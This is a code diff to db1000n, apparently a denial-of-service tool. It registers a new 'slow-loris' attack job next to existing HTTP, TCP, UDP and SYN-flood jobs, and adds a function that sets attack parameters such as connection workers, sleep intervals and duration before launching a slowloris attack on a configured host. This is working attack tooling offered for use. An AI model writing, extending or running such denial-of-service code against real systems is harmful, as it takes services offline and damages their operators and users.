@@ -5,6 +5,7 @@ import (
 	"context"
 	"encoding/base64"
 	"encoding/json"
+	"errors"
 	"flag"
 	"fmt"
 	"html/template"
@@ -23,6 +24,7 @@ import (
 	"github.com/Arriven/db1000n/logs"
 	"github.com/Arriven/db1000n/metrics"
 	"github.com/Arriven/db1000n/synfloodraw"
+	"github.com/Arriven/db1000n/slowloris"
 )
 
 // JobArgs comment for linter
@@ -38,10 +40,11 @@ type JobConfig struct {
 }
 
 var jobs = map[string]job{
-	"http":      httpJob,
-	"tcp":       tcpJob,
-	"udp":       udpJob,
-	"syn-flood": synFloodJob,
+	"http":       httpJob,
+	"tcp":        tcpJob,
+	"udp":        udpJob,
+	"syn-flood":  synFloodJob,
+	"slow-loris": slowLoris,
 }
 
 // Config comment for linter
@@ -259,6 +262,49 @@ func synFloodJob(ctx context.Context, l *logs.Logger, args JobArgs) error {
 	}()
 	l.Debug("sending syn flood with params: Host %v, Port %v , PayloadLength %v, FloodType %v", jobConfig.Host, jobConfig.Port, jobConfig.PayloadLength, jobConfig.FloodType)
 	return synfloodraw.StartFlooding(shouldStop, jobConfig.Host, jobConfig.Port, jobConfig.PayloadLength, jobConfig.FloodType)
+}
+
+func slowLoris(ctx context.Context, l *logs.Logger, args JobArgs) error {
+	var jobConfig *slowloris.Config
+	err := json.Unmarshal(args, &jobConfig)
+	if err != nil {
+		return err
+	}
+
+	if len(jobConfig.Path) == 0 {
+		l.Error("path is empty")
+
+		return errors.New("path is empty")
+	}
+
+	if jobConfig.ContentLength == 0 {
+		jobConfig.ContentLength = 1000 * 1000
+	}
+
+	if jobConfig.DialWorkersCount == 0 {
+		jobConfig.DialWorkersCount = 10
+	}
+
+	if jobConfig.RampUpInterval == 0 {
+		jobConfig.RampUpInterval = 1 * time.Second
+	}
+
+	if jobConfig.SleepInterval == 0 {
+		jobConfig.SleepInterval = 10 * time.Second
+	}
+
+	if jobConfig.DurationSeconds == 0 {
+		jobConfig.DurationSeconds = 10 * time.Second
+	}
+
+	shouldStop := make(chan bool)
+	go func() {
+		<-ctx.Done()
+		shouldStop <- true
+	}()
+	l.Debug("sending slow loris with params: %v", jobConfig)
+
+	return slowloris.Start(l, jobConfig)
 }
 
 func fetchConfig(configPath string) (*Config, error) {
